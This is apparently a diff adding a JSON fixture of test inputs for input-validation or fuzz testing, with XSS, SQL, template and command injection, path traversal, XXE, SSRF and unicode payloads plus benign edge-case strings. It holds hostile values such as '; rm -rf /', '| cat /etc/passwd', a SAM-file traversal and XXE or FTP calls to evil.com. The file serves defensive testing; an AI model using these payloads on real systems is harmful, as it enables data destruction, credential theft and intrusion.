@@ -1,0 +1,92 @@
+{
+  "xss": {
+    "script_tag": "<script>alert('xss')</script>",
+    "img_onerror": "<img src=x onerror=\"alert('test')\">",
+    "svg_onload": "<svg onload=\"alert('xss')\">",
+    "event_handler": "<div onmouseover=\"alert('xss')\">hover</div>",
+    "javascript_uri": "javascript:alert('xss')",
+    "data_uri_xss": "data:text/html,<script>alert('xss')</script>",
+    "encoded_script": "%3Cscript%3Ealert('xss')%3C/script%3E",
+    "nested_script": "<<script>script>alert('xss')<</script>/script>"
+  },
+  "sql_injection": {
+    "single_quote": "' OR '1'='1",
+    "double_quote": "\" OR \"1\"=\"1",
+    "comment_drop": "-- ; DROP TABLE users;",
+    "union_select": "' UNION SELECT * FROM users --",
+    "semicolon_chain": "1; DROP TABLE users; SELECT * FROM admin --",
+    "hex_encoded": "0x27204F5220273127273D2731",
+    "boolean_blind": "1' AND 1=1 --",
+    "time_blind": "1' AND SLEEP(5) --"
+  },
+  "template_injection": {
+    "javascript_template": "${7*7}",
+    "jinja2": "{{7*7}}",
+    "erb": "<%=7*7%>",
+    "freemarker": "${\"freemarker\".class.forName(\"java.lang.Runtime\")}",
+    "pug": "#{7*7}",
+    "ejs": "<%= process.env %>",
+    "handlebars": "{{constructor.constructor('return process')()}}"
+  },
+  "command_injection": {
+    "semicolon": "; rm -rf /",
+    "pipe": "| cat /etc/passwd",
+    "backtick": "`whoami`",
+    "dollar_paren": "$(whoami)",
+    "ampersand": "& dir C:\\",
+    "newline": "test\nwhoami"
+  },
+  "path_traversal": {
+    "unix": "../../../etc/passwd",
+    "windows": "..\\..\\..\\Windows\\System32\\config\\SAM",
+    "encoded": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "double_encoded": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "null_byte": "test.txt\u0000.jpg"
+  },
+  "xxe": {
+    "basic": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+    "parameter_entity": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe;]><root/>",
+    "billion_laughs": "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;\">]><root>&lol2;</root>"
+  },
+  "unicode_attacks": {
+    "homograph": "раураӏ.com",
+    "rtl_override": "\u202Emalicious\u202C",
+    "zero_width_joiner": "te\u200Bst",
+    "zero_width_space": "admin\u200B",
+    "combining_chars": "a\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A",
+    "bidi_override": "\u202Ahello\u202B\u202Cworld\u202D\u202E",
+    "confusable_slash": "example.com\u2044path"
+  },
+  "protocol_attacks": {
+    "ssrf_localhost": "http://127.0.0.1:22",
+    "ssrf_metadata": "http://169.254.169.254/latest/meta-data/",
+    "ssrf_dns_rebind": "http://evil.com",
+    "file_protocol": "file:///etc/passwd",
+    "ftp_protocol": "ftp://evil.com/malware"
+  },
+  "edge_cases": {
+    "empty": "",
+    "whitespace_only": "   \t\n  ",
+    "single_char": "a",
+    "null_string": "null",
+    "undefined_string": "undefined",
+    "numeric_string": "12345",
+    "boolean_string": "true",
+    "very_long": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "unicode_mixed": "Hello 🌍 World! こんにちは العالم Héllo Wörld 你好世界 हैलो दुनिया שלום עולם Привет мир",
+    "combining_chars": "é=é ñ=ñ å=å",
+    "zero_width": "Zero\u200BWidth\u200CHere",
+    "rtl_mixed": "Mixed: Hello عالم World 你好 مرحبا",
+    "special_quotes": "\"Double\" 'Single' \u201CSmart\u201D \u00ABFrench\u00BB",
+    "tabs_spaces": "Tabs:\tOne\tTwo\tThree  Spaces:  One  Two  Three",
+    "emoji_complex": "Emojis 😀 😂 🤯 🧠 🔥 💻 🌐 🇵🇰 🇯🇵",
+    "math_chars": "Math: 1+1=2 50%<$100>=\"50\"",
+    "paths": "path/to/file C:\\Windows\\System32",
+    "url_email": "URL:https://example.com/test?x=1&y=2#hash Email:test.user+filter@example.co.uk",
+    "json_xml_embedded": "{\"name\":\"Hello\",\"value\":123} <root><tag>Hello</tag></root>",
+    "case_variants": "the quick-brown_fox jumps THE QUICK-BROWN_FOX JUMPS The_Quick-Brown_Fox_Jumps123",
+    "newlines_literal": "Line1\n\nLine4 and literal \\n\\n",
+    "max_int": "9007199254740991",
+    "negative_zero": "-0"
+  }
+}
